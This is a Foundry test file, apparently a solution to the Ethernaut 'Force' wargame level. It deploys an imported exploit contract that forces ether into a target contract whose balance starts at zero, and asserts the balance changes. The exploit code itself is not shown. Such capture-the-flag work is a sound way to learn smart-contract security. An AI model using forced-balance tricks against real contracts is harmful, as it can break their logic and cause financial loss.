// SPDX-License-Identifier: CC-BY-4.0
// Mia Stein solution to ethernaut

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {ForceExploit} from "src/07/ForceExploit.sol";


contract ForceTest is Test {

    ForceExploit exploit;
    address payable instance = payable(vm.addr(0x10053)); 
    address hacker = vm.addr(0x1337); 

    function setUp() public {
        vm.prank(instance);
        vm.deal(hacker, 1 ether);
    }

    function testForceHack() public {

        vm.startPrank(hacker);
        assert(instance.balance == 0);
        
        exploit = new ForceExploit{value: 0.0005 ether}(instance);

        assert(instance.balance != 0);
        vm.stopPrank();
        
    }
}